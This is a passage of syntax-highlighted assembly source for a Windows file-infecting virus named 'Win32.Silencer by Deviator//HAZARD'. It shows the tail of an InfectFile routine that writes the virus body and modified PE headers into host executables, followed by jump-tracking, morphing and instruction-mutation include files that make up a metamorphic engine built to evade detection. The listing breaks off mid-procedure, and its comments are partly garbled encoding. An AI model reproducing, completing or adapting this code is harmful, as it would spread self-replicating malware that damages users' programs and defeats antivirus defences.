    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">cVirLen</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">cVirLen</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">fsec</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sects</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">peh</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">need</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FSeek</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">dm</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ?ö&lt;R¿-R ö«&lt;R §¢R-¢R ô ðý£¿«÷ÿ¢¬</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">free</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">WriteFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CloseIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">nextone</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">cVirLen</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fsec</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">peh</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">cVirFullLen</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">dm</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'DH'</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Win32.Silencer by Deviator//HAZARD'</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">Jumps.inc</span><span class="sc0"> </span><span class="sc4">]---------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; ? R¦?ý£ « ý&lt;¯ -ÿ¡¢ Rcòð Jump'R÷ ð ¢R?R ôRýRö-R?R</span><span class="sc0">
</span><span class="sc1">; Different jmp/call/etc procedures</span><span class="sc0">

</span><span class="sc5">MaxJumps</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">

</span><span class="sc5">AddJump</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NearJ</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NearJ</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">sJump</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">TryXJ</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">sJump</span><span class="sc0">

</span><span class="sc5">d1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">NotJump</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">NotJump</span><span class="sc0">

</span><span class="sc5">sJump</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cbw</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">NoInv</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
</span><span class="sc5">NoInv</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">AddJmp</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NotJump</span><span class="sc0">
</span><span class="sc5">NearJ</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">AddJmp</span><span class="sc0">
</span><span class="sc5">NotJump</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">TryXJ</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">NotJump</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Fh</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">NotJump</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NearJ</span><span class="sc0">
</span><span class="sc5">AddJump</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">AddJmp</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Jmpn</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">Jumps</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">][</span><span class="sc8">edi</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Jmpn</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">AddJmp</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GetJmpAddr</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Jumps</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">Jmpn</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoJmpx</span><span class="sc0">
</span><span class="sc5">FindJJ</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ItHere</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">FindJJ</span><span class="sc0">
</span><span class="sc5">NoJmpx</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ItHere</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetJmpAddr</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CheckAddr</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">        </span><span class="sc1">; ESi - Addr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">Jmpn</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoJmp</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">Jumps</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CheckAr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NotPos</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">NotPos</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NoPoint</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">NoPoint</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">CheckAr</span><span class="sc0">
</span><span class="sc5">NoJmp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckAddr</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">PatchJumps</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">Jmpn</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoJmp</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Jumps</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DoPatch</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Skip1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NearJmp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NearJmp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">xNearJmp</span><span class="sc0">
</span><span class="sc1">;; Short Jmp</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">][</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NextLoop</span><span class="sc0">
</span><span class="sc5">xNearJmp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NextLoop</span><span class="sc0">
</span><span class="sc5">NearJmp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">][</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NextLoop</span><span class="sc0">
</span><span class="sc5">Skip1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc5">NextLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">DoPatch</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">PatchJumps</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">Morph.inc</span><span class="sc0"> </span><span class="sc4">]----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; 'Rö¡¢÷?--R ¡ÿ¿ÿ ô R¦?ý£ ÿ-¿R ¤? </span><span class="sc0">
</span><span class="sc1">; Morpher</span><span class="sc0">

</span><span class="sc5">Morph</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc1">; ESi - SRC, EDi - DST, Returns: ECX - new size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">xMorph</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">MaxMorph</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; "R òR-¦ÿ ýR¨&lt;ð ?</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">AllDone</span><span class="sc0">                 </span><span class="sc1">; Some data more ?</span><span class="sc0">
    
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckBlock</span><span class="sc0">              </span><span class="sc1">; Code ?</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">SkipByte</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">DoGarble</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckVariable</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckAddr</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckDataAddr</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckTblAddr</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetSize32</span><span class="sc0">           </span><span class="sc1">; ?Rý. ?ÿ¿?  òR¿¿ÿ-ý«</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Mutate</span><span class="sc0">              </span><span class="sc1">; Permutate instruction</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; (if possible)</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">AddGarb</span><span class="sc0">             </span><span class="sc1">; Permutated ?</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; Just copy</span><span class="sc0">
</span><span class="sc5">AddGarb</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;   Call    DoGarble</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GarbLvl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">xMorph</span><span class="sc0">
</span><span class="sc5">SkipByte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckVariable</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckAddr</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckDataAddr</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckTblAddr</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; "ÿ--«?. ?Rôð £?¿ öÿc¢</span><span class="sc0">
                        </span><span class="sc1">; Data. Copy byte</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">xMorph</span><span class="sc0">
</span><span class="sc5">AllDone</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; ?ÿ¡¡§ð¢ÿ?¿ -R÷«c  ÿ¿? </span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Morph</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">Mutate.inc</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">-------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; Simple instruction permutator</span><span class="sc0">

</span><span class="sc5">Mutate</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">MutTbl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Findt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
